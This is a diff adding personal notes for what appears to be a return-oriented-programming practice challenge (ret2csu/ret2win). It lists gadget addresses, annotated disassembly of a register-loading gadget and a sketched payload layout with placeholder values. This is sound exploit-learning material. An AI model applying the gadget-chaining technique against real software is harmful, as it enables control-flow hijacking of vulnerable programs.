@@ -1,0 +1,37 @@
+0x0000000000400588: pop rbp; ret;
+0x00000000004006a3: pop rdi; ret;
+
+
+
+   0x0000000000400680 <+64>:    mov    rdx,r15
+   0x0000000000400683 <+67>:    mov    rsi,r14
+   0x0000000000400686 <+70>:    mov    edi,r13d
+   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
+
+
+   0x000000000040069a <+90>:    pop    rbx      # nothing?
+   0x000000000040069b <+91>:    pop    rbp      # 8 * plus call
+   0x000000000040069c <+92>:    pop    r12      # base of call
+   0x000000000040069e <+94>:    pop    r13      # 1st arg
+   0x00000000004006a0 <+96>:    pop    r14      # 2nd argument
+   0x00000000004006a2 <+98>:    pop    r15      # 3rd argument, may only be 32 bit
+   0x00000000004006a4 <+100>:   ret
+
+
+
+  0x00000000004006a3: pop rdi; ret;
+
+
+###### Payload #######
+
+pop everything
+0000000
+0000000
+location of pop rdi addr
+0xdeadbeefdeadbeef
+0xcafebabecafebabe
+0xd00df00dd00df00d
+qword call address
+
+0xdeadbeefdeadbeef
+ret2win@plt call
